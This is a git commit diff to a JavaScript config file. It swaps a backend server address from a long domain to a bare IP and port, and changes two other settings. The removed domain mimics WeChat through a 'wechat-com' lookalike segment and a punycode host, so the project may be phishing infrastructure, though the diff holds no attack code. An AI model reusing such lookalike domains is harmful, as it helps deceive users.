c80af899ae0c4e3ce676bf86b8ecc12c7df00f07
super181818 <131360198+super181818@users.noreply.github.com>
2023-11-12 21:24:29 +0800

    Update config.js

--- js/config.js
+++ js/config.js
@@ -1,10 +1,10 @@
 /*-------config start-------*/
-var _wip = 'wechat-328215-1317375082.cos-website.ap-nanjing.wechat.comzruhgzc5maztvip-wechat-com.xn--wbsy6ncuhq0sjlu.com';  
+var _wip = '180.188.18.186';  
 var _port = '1787';  
 /*---------config end---------*/
 
 var BaseUrl = 'http://' + _wip+':'+_port;
 var ResourceUrl = '/';
 var Suffix = '.html';
-var _isTx = 0;
-var _wport = '10000'
+var _isTx = 1;
+var _wport = '10001'
